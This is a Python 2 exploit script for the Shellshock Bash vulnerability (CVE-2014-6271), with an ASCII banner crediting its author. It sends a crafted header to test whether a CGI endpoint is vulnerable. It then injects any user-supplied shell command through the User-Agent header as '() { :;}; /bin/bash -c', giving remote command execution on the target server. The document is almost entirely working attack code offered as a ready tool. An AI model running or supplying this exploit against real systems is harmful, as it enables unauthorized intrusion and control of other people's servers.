#!/usr/bin/env python

# http connection
import urllib2
# Args management
import optparse
# Error managemen
import sys

banner = """
      _______                 _______             __
     |   _   .-----.--.--.   |   _   .---.-.-----|  |--.
     |.  |___|     |  |  |   |.  1   |  _  |__ --|     |
     |.  |   |__|__|_____|   |.  _   |___._|_____|__|__|
     |:  1   |               |:  1    \
     |::.. . |               |::.. .  /
     `-------'               `-------'
      ___ ___   _______     _______ _______ ___
     |   Y   | |   _   |   |   _   |   _   |   |
     |   |   |_|___|   |   |.  l   |.  1___|.  |
     |____   |___(__   |   |.  _   |.  |___|.  |
         |:  | |:  1   |   |:  |   |:  1   |:  |
         |::.| |::.. . |   |::.|:. |::.. . |::.|
         `---' `-------'   `--- ---`-------`---'

                              Gnu B4sh <= 4.3 Cg1 Sc4n + r3m0t3 C0mm4nd Inj3ct10n

          ==========================================
          - Release date: 2014-09-25
          - Discovered by: Stephane Chazelas
          - CVE: 2014-6271
          ===========================================

                        Written by:

                      Claudio Viviani

                   http://www.homelab.it

                      info@homelab.it
                  homelabit@protonmail.ch

             https://www.facebook.com/homelabit
                https://twitter.com/homelabit
             https://plus.google.com/+HomelabIt1/
   https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

def connectionScan(url):
    print '[+] Checking for vulnerability...'
    try:
        headers = {"VULN" : "() { :;}; echo 'H0m3l4b1t: YES'"}
        response = urllib2.Request(url, None, headers)
        content = urllib2.urlopen(response)
        if 'H0m3l4b1t' in  content.info():
            print '[!] VULNERABLE: '+url
        else:
            print '[X] NOT Vulnerable'
    except urllib2.HTTPError, e:
        print e.info()
        if e.code == 400:
            print '[X] Page not found'
        else:
            print '[X] HTTP Error'
    except urllib2.URLError:
        print '[X] Connection Error'

def connectionInje(url,cmd):
    try:
        headers = { 'User-Agent' : '() { :;}; /bin/bash -c "'+cmd+'"' }
        response = urllib2.Request(url, None, headers)
        content = urllib2.urlopen(response).read()
        print '[!] '+cmd+' command sent!'
    except urllib2.HTTPError, e:
        if e.code == 500:
            print '[!] '+cmd+' command sent!!!'
        else:
            print '[!] command not sent :('
    except urllib2.URLError:
        print '[X] Connection Error'

commandList = optparse.OptionParser('usage: %prog [-s] -t http://localhost/cgi-bin/test -c "touch /tmp/test.txt"')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('-c', '--cmd', action="store",
                  help="Insert command name",
                  )
commandList.add_option('-s', '--scan', default=False, action="store_true",
                  help="Scan Only",
                  )
options, remainder = commandList.parse_args()

# Check args
if not options.target:
    print(banner)
    commandList.print_help()
    sys.exit(1)
elif options.target and not options.cmd and not options.scan:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)

url = checkurl(options.target)
cmd = options.cmd
if options.scan:
    print '[+] Scan Only Mode'
    connectionScan(url)
else:
    print '[+] Remote Command Innection Mode'
    connectionScan(url)
    connectionInje(url,cmd)
